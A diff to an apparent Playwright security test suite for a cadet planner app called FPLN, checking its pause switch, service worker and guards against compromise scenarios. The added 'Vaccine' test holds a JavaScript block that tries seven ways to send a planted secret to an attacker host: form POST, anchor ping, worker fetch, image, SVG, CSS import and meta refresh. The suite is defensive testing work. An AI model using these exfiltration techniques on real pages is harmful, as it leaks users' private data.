@@ -37,6 +37,7 @@ def fresh_site():
     os.makedirs(SITE)
     for f in FILES: shutil.copy(os.path.join(REPO, f), SITE)
     shutil.copytree(os.path.join(REPO, "icons"), os.path.join(SITE, "icons"))
+    if os.path.isdir(os.path.join(REPO, "vendor")): shutil.copytree(os.path.join(REPO, "vendor"), os.path.join(SITE, "vendor"))
     for a in (["restore"], ["switches", "--off", "none"], ["clear-banner"]):
         subprocess.run([sys.executable, CTL, *a, "--root", SITE], capture_output=True)
 fresh_site()
@@ -120,6 +121,16 @@ def install(ctx, data=True):
     pg = ctx.new_page(); pg.goto(URL); time.sleep(4); pg.reload(); time.sleep(3)
     if data: pg.evaluate("localStorage.setItem('fpln:clock', JSON.stringify({v:3,tasks:[{id:'r1',t:'PLANNER SECRET'}]}))")
     return pg
+def done(ctx, pg, r):
+    """Keep the app's own flight-recorder view of the scenario (what it saw and did), then close."""
+    try:
+        ev = pg.evaluate("window.FPLN_MONITOR ? window.FPLN_MONITOR.events().filter(function(e){ return !e.old; }).slice(-60) : []")
+        g = pg.evaluate("window.FPLN_MONITOR ? window.FPLN_MONITOR.gauges() : null")
+        if ev: r["recorder"] = ev
+        if g: r["gauges"] = {k: g[k] for k in ("allowed", "blocked", "writes", "errors", "csp", "checks") if k in g}
+    except Exception: pass
+    try: ctx.close()
+    except Exception: pass
 def nudge(pg, reload=True):
     if reload:
         try:
@@ -152,7 +163,7 @@ def c1(b, r):
     got, layers = attribute(r, out, csp)
     r["layers"] = layers
     r["observed"].append("%d of %d channels got out" % (len(got), len(CHANNELS)) + (": " + ", ".join(got) if got else ""))
-    r["verdict"] = "BREACH" if got else "CONTAINED"; ctx.close()
+    r["verdict"] = "BREACH" if got else "CONTAINED"; done(ctx, pg, r)
 
 @scenario("C2", "Compromise", "Same theft attempt after you press Pause", "The owner pauses FPLN; the malicious code tries all 12 channels again.", "Nothing reaches the attacker; the pause screen stays up.")
 def c2(b, r):
@@ -162,7 +173,7 @@ def c2(b, r):
     got, layers = attribute(r, out, csp)
     r["layers"] = ["L1 main signal", "L3 device latch", "L5 browser lock"] + layers
     r["observed"].append("Paused: %s · %d of %d channels got out" % ("yes" if locked(pg) else "NO", len(got), len(CHANNELS)))
-    r["verdict"] = "BREACH" if got or not locked(pg) else "CONTAINED"; ctx.close()
+    r["verdict"] = "BREACH" if got or not locked(pg) else "CONTAINED"; done(ctx, pg, r)
 
 @scenario("C3", "Compromise", "Poisoned update strips the app's guard", "A bad release reaches the site with the guard script removed and theft code added. Devices that already have FPLN load it.", "The release scan blocks it before it ships. If it shipped anyway, the service worker still stops the theft.")
 def c3(b, r):
@@ -186,7 +197,7 @@ def c3(b, r):
     r["layers"] = (["G1 release scan"] if blocked else []) + layers
     r["verdict"] = "BREACH" if got else ("CONTAINED" if blocked else "CONTAINED")
     if got and blocked: r["verdict"] = "DETECTED"
-    ctx.close()
+    done(ctx, pg, r)
 
 @scenario("C4", "Compromise", "Attacker controls the whole site", "Someone with your GitHub account replaces both the app and its service worker with their own code.", "Device layers can't stop the owner's own account. Account security and the GitHub checks are the protection.")
 def c4(b, r):
@@ -199,7 +210,7 @@ def c4(b, r):
     r["observed"].append("%d of %d channels got out once the attacker replaced every file" % (len(got), len(CHANNELS)))
     r["observed"].append("Covered by: two-factor sign-in on GitHub, the release scan and GitHub safety check on every push, and the Actions run list on your checklist.")
     r["layers"] = ["G2 GitHub safety check", "G4 owner-only controls"]
-    r["verdict"] = "LIMIT"; ctx.close()
+    r["verdict"] = "LIMIT"; done(ctx, pg, r)
 
 @scenario("C5", "Compromise", "Forged or broken signal tries to unpause", "While FPLN is paused, an attacker rewrites control.json to say none (version.json still says pause), then corrupts it, then sends an unknown state.", "FPLN stays paused through all three.")
 def c5(b, r):
@@ -212,7 +223,7 @@ def c5(b, r):
     c["kill"] = {"state": "unlock-everything", "id": "x"}; write("control.json", json.dumps(c)); nudge(pg, False); time.sleep(2); states.append(("unknown state", locked(pg)))
     for n, s in states: r["observed"].append("%s: %s" % (n, "still paused" if s else "UNPAUSED"))
     r["layers"] = ["L2 backup signal", "L3 device latch"]
-    r["verdict"] = "CONTAINED" if all(s for _, s in states) else "BREACH"; ctx.close()
+    r["verdict"] = "CONTAINED" if all(s for _, s in states) else "BREACH"; done(ctx, pg, r)
 
 @scenario("C6", "Compromise", "Script hidden in a message", "Banner and pause messages carry HTML and script meant to run inside FPLN.", "Shown as plain text; nothing runs.")
 def c6(b, r):
@@ -225,7 +236,7 @@ def c6(b, r):
     r["observed"].append("Banner: %s" % ("shown as text, nothing ran" if "onerror" in t1 and not p1 else "CODE RAN" if p1 else "not shown"))
     r["observed"].append("Pause message: %s" % ("shown as text, nothing ran" if "onerror" in t2 and not p2 else "CODE RAN" if p2 else "not shown"))
     r["layers"] = ["L4 app guard (text only)"]
-    r["verdict"] = "BREACH" if (p1 or p2) else "CONTAINED"; ctx.close()
+    r["verdict"] = "BREACH" if (p1 or p2) else "CONTAINED"; done(ctx, pg, r)
 
 @scenario("C7", "Compromise", "Code inside FPLN tries to free itself", "While paused, malicious code deletes the pause latch and the worker's copy of the pause, then restarts FPLN.", "FPLN re-locks on its next check; outside traffic stays blocked.")
 def c7(b, r):
@@ -237,7 +248,7 @@ def c7(b, r):
     out = pg.evaluate(EXFIL, ATK); csp = pg.evaluate("window.__csp||[]"); got, layers = attribute(r, out, csp)
     r["observed"].append("Re-locked: %s · %d channels got out" % ("yes" if rel else "NO", len(got)))
     r["layers"] = ["L1 main signal", "L2 backup signal"] + layers
-    r["verdict"] = "BREACH" if got or not rel else "CONTAINED"; ctx.close()
+    r["verdict"] = "BREACH" if got or not rel else "CONTAINED"; done(ctx, pg, r)
 
 @scenario("C8", "Compromise", "Code keeps rewriting data during Erase", "While the owner erases FPLN, malicious code writes the planner back every 50 ms.", "After Erase, no FPLN data remains.")
 def c8(b, r):
@@ -248,7 +259,7 @@ def c8(b, r):
     left = [k for k in keys if k.startswith("fpln") and k not in ("fpln:lock", "fpln:ring")]
     r["observed"].append("FPLN data left after erase: %s" % (", ".join(left) if left else "none"))
     r["layers"] = ["L3 device latch", "Erase re-wipe on start"]
-    r["verdict"] = "BREACH" if left else "CONTAINED"; ctx.close()
+    r["verdict"] = "BREACH" if left else "CONTAINED"; done(ctx, pg, r)
 
 @scenario("C9", "Compromise", "Fake test group tries to cancel a pause", "A device is enrolled in a group whose orders say none while everyone is paused.", "The most severe order wins; the device stays paused.")
 def c9(b, r):
@@ -261,7 +272,7 @@ def c9(b, r):
     nudge(pg); time.sleep(1)
     r["observed"].append("Device in group: %s · paused: %s" % ("yes" if pg.evaluate("localStorage.getItem('fpln:ring')") == h else "no", "yes" if locked(pg) else "NO"))
     r["layers"] = ["L1 main signal", "L2 backup signal"]
-    r["verdict"] = "CONTAINED" if locked(pg) else "BREACH"; ctx.close()
+    r["verdict"] = "CONTAINED" if locked(pg) else "BREACH"; done(ctx, pg, r)
 
 @scenario("C10", "Compromise", "Orders arrive out of order", "Pause and Restore are pressed seconds apart; the Restore run finishes first, then the slower Pause run tries to apply. Then an attacker replays an old Pause.", "The newest order wins; an older or replayed order is refused.")
 def c10(b, r):
@@ -284,7 +295,7 @@ def b1(b, r):
     nudge(pg, False); pg.reload(); time.sleep(4)
     r["observed"].append("Paused after site failure and restart: %s" % ("yes" if locked(pg) else "NO"))
     r["layers"] = ["L3 device latch", "L6 service worker"]
-    r["verdict"] = "CONTAINED" if locked(pg) else "BREACH"; ctx.close()
+    r["verdict"] = "CONTAINED" if locked(pg) else "BREACH"; done(ctx, pg, r)
 
 @scenario("B2", "Break", "Site goes down during normal use", "The site is unreachable while cadets use FPLN normally.", "FPLN keeps working for cadets. New orders can't arrive until the site is back.")
 def b2(b, r):
@@ -296,7 +307,7 @@ def b2(b, r):
     r["observed"].append("App still works: %s · theft still blocked: %s" % ("yes" if works else "NO", "yes" if not got else "NO"))
     r["observed"].append("Covered by: kill paths B–E don't depend on the site being up; a device that can't reach the site can't reach anyone else's server either through FPLN.")
     r["layers"] = layers
-    r["verdict"] = "BREACH" if got else "LIMIT"; ctx.close()
+    r["verdict"] = "BREACH" if got else "LIMIT"; done(ctx, pg, r)
 
 @scenario("B3", "Break", "Service worker missing while paused", "The background worker is removed (cleared by the browser or a bug) on a paused device.", "The app's own layers keep it paused and blocked.")
 def b3(b, r):
@@ -306,7 +317,7 @@ def b3(b, r):
     out = pg.evaluate(EXFIL, ATK); csp = pg.evaluate("window.__csp||[]"); got, layers = attribute(r, out, csp)
     r["observed"].append("Paused: %s · %d channels got out" % ("yes" if locked(pg) else "NO", len(got)))
     r["layers"] = ["L3 device latch", "L5 browser lock"] + [l for l in layers if not l.startswith("L6")]
-    r["verdict"] = "BREACH" if got or not locked(pg) else "CONTAINED"; ctx.close()
+    r["verdict"] = "BREACH" if got or not locked(pg) else "CONTAINED"; done(ctx, pg, r)
 
 @scenario("B4", "Break", "Broken release while paused", "A release ships with the guard script missing while FPLN is paused.", "No pause screen, but the service worker still blocks everything outside.")
 def b4(b, r):
@@ -317,7 +328,7 @@ def b4(b, r):
     screen = "app pause screen" if locked(pg) else ("worker's own pause screen" if "paused" in (pg.inner_text("body") or "").lower() else "none")
     r["observed"].append("Shown: %s · %d channels got out" % (screen, len(got)))
     r["layers"] = ["L6 service worker (pause screen + browser policy)"]
-    r["verdict"] = "BREACH" if got else "CONTAINED"; ctx.close()
+    r["verdict"] = "BREACH" if got else "CONTAINED"; done(ctx, pg, r)
 
 @scenario("B5", "Break", "Cadet clears browser data while paused", "The cadet clears site data on a paused device, then opens FPLN online.", "FPLN re-locks on its first check.")
 def b5(b, r):
@@ -327,7 +338,7 @@ def b5(b, r):
     if not locked(pg): nudge(pg)
     r["observed"].append("Re-locked: %s (about %d s)" % ("yes" if locked(pg) else "NO", time.time() - t0))
     r["layers"] = ["L1 main signal", "L6 service worker"]
-    r["verdict"] = "CONTAINED" if locked(pg) else "BREACH"; ctx.close()
+    r["verdict"] = "CONTAINED" if locked(pg) else "BREACH"; done(ctx, pg, r)
 
 @scenario("B6", "Break", "One signal copy missing", "Pause is sent, then control.json disappears; separately version.json disappears.", "Either copy alone keeps the pause.")
 def b6(b, r):
@@ -335,7 +346,7 @@ def b6(b, r):
     for missing in ("control.json", "version.json"):
         fresh_site(); ctx = new_ctx(b); pg = install(ctx)
         sig("freeze", "--msg", "Paused"); os.remove(os.path.join(SITE, missing)); nudge(pg)
-        ok.append(locked(pg)); r["observed"].append("%s missing: %s" % (missing, "paused" if locked(pg) else "NOT PAUSED")); ctx.close()
+        ok.append(locked(pg)); r["observed"].append("%s missing: %s" % (missing, "paused" if locked(pg) else "NOT PAUSED")); done(ctx, pg, r)
     r["layers"] = ["L1 main signal", "L2 backup signal"]
     r["verdict"] = "CONTAINED" if all(ok) else "BREACH"
 
@@ -346,7 +357,53 @@ def b7(b, r):
     before = locked(pg); ctx.set_offline(False); t0 = time.time(); nudge(pg)
     r["observed"].append("Paused while offline: %s · paused after reconnect: %s (about %d s)" % ("yes" if before else "no (expected)", "yes" if locked(pg) else "NO", time.time() - t0))
     r["layers"] = ["L1 main signal"]
-    r["verdict"] = "CONTAINED" if locked(pg) else "BREACH"; ctx.close()
+    r["verdict"] = "CONTAINED" if locked(pg) else "BREACH"; done(ctx, pg, r)
+
+# ---------------- VACCINE: current threats from threats.json ----------------
+TECH = r"""async ([tech, T]) => {
+  const d = encodeURIComponent('PLANNER-SECRET'); const wait = (ms) => new Promise(r => setTimeout(r, ms)); let res = 'attempted';
+  try {
+    if (tech === 'attacker-form') { await fetch('https://docs.google.com/forms/d/e/1FAIpQLattackerOwnForm000000000000000/formResponse?entry.1=' + d, {method: 'POST', mode: 'no-cors'}); }
+    if (tech === 'a-ping') { const a = document.createElement('a'); a.href = '#'; a.setAttribute('ping', T + '/a-ping?d=' + d); document.body.appendChild(a); a.click(); a.remove(); await wait(1200); }
+    if (tech === 'worker-fetch') { const b = new Blob(["fetch('" + T + "/worker-fetch?d=" + d + "',{mode:'no-cors'}).then(()=>postMessage('sent'),e=>postMessage('refused: '+e.message))"], {type: 'text/javascript'});
+      const w = new Worker(URL.createObjectURL(b)); res = await new Promise(r => { w.onmessage = e => r(e.data); w.onerror = e => r('refused: worker blocked'); setTimeout(() => r('timeout'), 2500); }); }
+    if (tech === 'innerhtml-img') { const x = document.createElement('div'); x.innerHTML = '<img src="' + T + '/innerhtml-img?d=' + d + '">'; document.body.appendChild(x); await wait(1200); }
+    if (tech === 'svg-image') { const x = document.createElement('div'); x.innerHTML = '<svg><image href="' + T + '/svg-image?d=' + d + '"/></svg>'; document.body.appendChild(x); await wait(1200); }
+    if (tech === 'css-import') { const st = document.createElement('style'); st.textContent = '@import url("' + T + '/css-import?d=' + d + '");'; document.head.appendChild(st); await wait(1200); }
+    if (tech === 'frame-refresh') { const f = document.createElement('iframe'); f.srcdoc = '<meta http-equiv="refresh" content="0;url=' + T + '/frame-refresh?d=' + d + '">'; document.body.appendChild(f); await wait(2000); }
+  } catch (e) { res = 'refused: ' + String(e && e.message || e).slice(0, 80); }
+  return res;
+}"""
+def vaccine_list():
+    try: return [t for t in json.load(open(os.path.join(REPO, ".github", "safety", "threats.json")))["threats"] if t["type"] in ("exfil", "api-absent")]
+    except Exception: return []
+VAX = vaccine_list()
+@scenario("V1", "Vaccine", "Current threats from the weekly threat list", "Each technique on the vaccine list is tried by hostile code inside FPLN while it runs normally.", "Every technique is refused; nothing reaches the attacker.")
+def v1(b, r):
+    ctx = new_ctx(b); pg = install(ctx); bad = []
+    for t in VAX:
+        HITS.clear()
+        if t["type"] == "api-absent":
+            out = pg.evaluate("""(api) => { try { const f = document.createElement('iframe'); document.body.appendChild(f);
+              for (const w of [window, f.contentWindow]) { if (typeof w[api] === 'function') { try { new w[api]({iceServers: []}); return 'AVAILABLE'; } catch (e) { if (!/FPLN/.test(String(e && e.message))) return 'AVAILABLE'; } } }
+              return 'refused'; } catch (e) { return 'refused'; } }""", t["api"])
+            ok = out != "AVAILABLE"; how = "Removed by app guard (L4)" if ok else "AVAILABLE"
+        else:
+            csp0 = len(pg.evaluate("window.__csp||[]"))
+            out = pg.evaluate(TECH, [t["technique"], ATK]); time.sleep(0.5)
+            csp = pg.evaluate("window.__csp||[]")[csp0:]
+            hit = any(h.startswith(t["technique"]) for h in HITS)
+            external = t["technique"] == "attacker-form"
+            if hit: ok, how = False, "GOT OUT"
+            elif "FPLN" in str(out): ok, how = True, "Stopped: app guard (L4)"
+            elif csp: ok, how = True, "Stopped: browser policy (L8)"
+            elif external: ok, how = False, "NOT REFUSED (would reach Google)"
+            else: ok, how = True, "Stopped: service worker or browser (L6)"
+        r["channels"][t["id"]] = how
+        if not ok: bad.append(t["id"])
+    r["observed"].append("%d of %d current threats refused" % (len(VAX) - len(bad), len(VAX)) + (": failed " + ", ".join(bad) if bad else ""))
+    r["layers"] = sorted(set(("L4 app guard" if "L4" in v else "L8 allowlist policy" if "L8" in v else "L6 service worker") for v in r["channels"].values() if "Stopped" in v or "Removed" in v))
+    r["verdict"] = "BREACH" if bad else "CONTAINED"; done(ctx, pg, r)
 
 started = time.time()
 from playwright.sync_api import sync_playwright
